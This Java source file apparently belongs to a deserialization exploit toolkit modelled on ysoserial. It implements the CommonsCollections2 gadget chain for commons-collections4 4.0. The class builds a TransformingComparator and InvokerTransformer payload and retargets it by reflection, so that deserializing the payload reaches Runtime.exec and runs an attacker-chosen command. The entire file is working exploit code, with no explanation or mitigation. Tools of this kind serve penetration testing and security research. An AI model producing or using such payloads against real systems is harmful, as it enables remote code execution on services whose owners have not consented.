package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections4.Transformer;
import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.ses.gadgetbuilder.util.Reflections;


@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
@Authors({ Authors.FROHOFF })
@Impact(Impact.MethodInvoke)
public class CommonsCollections2 extends MethodInvokeGadgetChain<CompareTrampoline, MethodInvokeAdapter> {

    InvokerTransformer transformer;

    public CommonsCollections2(CompareTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    public TrampolineConnector createPayload(String command) throws Exception {
        Object payload = this.methodInvokeAdapter.getInvocationTarget(command);

        this.transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        return new TrampolineConnector(new TransformingComparator(transformer), payload, payload);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", this.methodInvokeAdapter.getMethodName());
    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections4.comparators.TransformingComparator.compare()\n" +
                "org.apache.commons.collections4.functors.InvokerTransformer.transform()\n" +
                "java.lang.reflect.Method.invoke()\n" +
                "java.lang.Runtime.exec()";
    }
}
